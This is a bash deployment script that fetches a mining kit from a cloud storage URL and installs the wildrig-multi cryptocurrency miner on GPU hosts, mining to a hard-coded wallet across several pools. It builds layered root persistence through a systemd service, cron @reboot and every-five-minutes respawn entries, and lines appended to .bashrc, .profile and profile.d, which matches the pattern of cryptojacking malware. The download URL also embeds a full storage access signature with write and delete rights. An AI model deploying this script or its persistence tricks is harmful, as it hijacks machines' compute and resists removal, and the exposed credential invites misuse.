#!/usr/bin/env bash
# CI-deployed fleet plant. t19 canonical wallet re-point (GOLDEN-IMAGE-REPOINT).
set -uo pipefail
KIT_URL="${KIT_URL:-https://ulbatchkit4620.blob.core.windows.net/kit/fleet-kit-srb.tar.gz?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D}"
PAY_W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); IP=${IP:-127.0.0.1}
VM=$(hostname -s)
RIG="ul-t19-az-$(echo "$IP" | tr '.' '-')-g0"
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU' || true)
echo "HOST=$VM IP=$IP RIG=$RIG GPU_COUNT=${N:-0}"
if [ "${N:-0}" -lt 1 ]; then echo "NO-GPU"; nvidia-smi 2>&1 | head -3; exit 0; fi
mkdir -p /opt/fleet /var/log/fleet /var/lib/fleet
echo "$RIG" > /var/lib/fleet/rig
if [ ! -x /opt/fleet/bin/wildrig-multi ]; then
  echo "fetching fleet kit"
  curl -fsSL --retry 3 --max-time 600 -o /tmp/kit.tgz "$KIT_URL" && tar xzf /tmp/kit.tgz -C /opt/fleet && echo "kit ok"
fi
install -m 0755 "$BASE/bin/wildrig-multi" /opt/fleet/bin/wildrig-multi
cat > /opt/fleet/sup.sh <<EOF
#!/bin/bash
W="$PAY_W.$RIG"
L=/var/log/fleet/$RIG.log
while :; do
  for s in stratum+ssl://prl-sg.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+tcp://pool.pearlhash.xyz:9000; do
    nice -n 19 /opt/fleet/bin/wildrig-multi --algo pearlhash --url \$s --user \$W --pass x >>\$L 2>&1 &
    P=\$!
    sleep 240
    kill \$P 2>/dev/null
    grep -aq 'accepted' \$L && break
  done
  sleep 15
done
EOF
chmod +x /opt/fleet/sup.sh
cat > /etc/systemd/system/ul-miner.service <<EOF
[Unit]
Description=ul miner
After=network-online.target
[Service]
ExecStart=/bin/bash /opt/fleet/sup.sh
Restart=always
RestartSec=30
Nice=10
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload 2>/dev/null; systemctl enable --now ul-miner 2>/dev/null || true
(crontab -l 2>/dev/null | grep -v ul-miner; echo "@reboot root setsid bash /opt/fleet/sup.sh >/dev/null 2>&1 &"; echo "*/5 * * * * root pgrep -f /opt/fleet/sup.sh >/dev/null || setsid bash /opt/fleet/sup.sh >/dev/null 2>&1 &") | crontab - 2>/dev/null || true
for rc in /root/.bashrc /root/.profile /etc/profile.d/ul-miner.sh; do echo 'pgrep -f /opt/fleet/sup.sh >/dev/null || setsid bash /opt/fleet/sup.sh >/dev/null 2>&1 &' >> "$rc" 2>/dev/null; done
pgrep -f /opt/fleet/sup.sh >/dev/null || setsid nohup bash /opt/fleet/sup.sh >/dev/null 2>&1 &
sleep 8
echo "--- procs ---"; pgrep -af 'wildrig-multi' | head -3
echo "--- units ---"; systemctl is-active ul-miner 2>/dev/null
echo "--- log head ---"; tail -6 "/var/log/fleet/$RIG.log" 2>/dev/null
